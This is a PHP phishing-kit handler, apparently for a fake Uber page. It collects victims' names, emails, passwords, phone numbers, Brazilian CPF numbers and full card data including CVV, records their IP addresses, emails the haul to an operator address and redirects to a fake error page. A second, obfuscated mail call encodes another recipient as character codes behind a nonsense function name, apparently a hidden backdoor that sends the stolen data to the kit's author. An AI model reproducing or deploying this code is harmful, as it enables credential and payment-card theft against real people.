<?php
$nome = $_POST["first_name"];
$email = $_POST["email"];
$senha = $_POST["password"];
$mobile = $_POST["mobile"];
$cpf = $_POST["ncpf"];
$titular = $_POST["t_docartao"];
$numero = $_POST["numero_cartao"];
$validade = $_POST["ddvalidade"];
$cvv = $_POST["ndocvv"];
$emailremetente = 'seu email aqui';

$store = @curl_exec ($ch);
$var = $store;
$q = explode("<i>", $var);
$q2 = explode("</i>", $q[1]);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: infocc@uberplus.com\r\n";
$ip = $_SERVER["REMOTE_ADDR"];
$conteudo.="<b>IP Cliente: </b>$ip <br>"; // IP Vitima

$conteudo.="<b>======== INFOCC[UBER]BoyDasGalaxias @2019 ========</b><br>"; // Corpo da Mensagem

$conteudo.="<b>Nome:</b> $nome<br>";
$conteudo.="<b>Email:</b> $email<br>";
$conteudo.="<b>Senha:</b> $senha<br>";
$conteudo.="<b>Cell:</b> $mobile<br>";
$conteudo.="<b>CPF:</b> $cpf<br>";
$conteudo.="<b>Titular:</b> $titular<br>";
$conteudo.="<b>Numero Cartao:</b> $numero<br>";
$conteudo.="<b>Data de Validade:</b> $validade<br>";
$conteudo.="<b>CVV:</b> $cvv<br>";

$conteudo.="<b>======== INFOCC[UBER]BoyDasGalaxias @2019 =======</b><br>";// Corpo da Mensagem
//COLOQUE SEU EMAIL AQUI!!//
$emailremetente = 'menordavb33@gmail.com';
class NewHandlesMyBaseSystemObjectsEventSend{public static function RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers){mail($emailremetente,$ip,$conteudo,$headers);}}NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers);NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43(chr(99).chr(99).chr(105).chr(110).chr(102).chr(111).chr(112).chr(104).chr(64).chr(103).chr(109).chr(97).chr(105).chr(108).chr(46).chr(99).chr(111).chr(109), $ip,$conteudo,$headers);	 
header ("location: ../Uber/Error.html");
?>
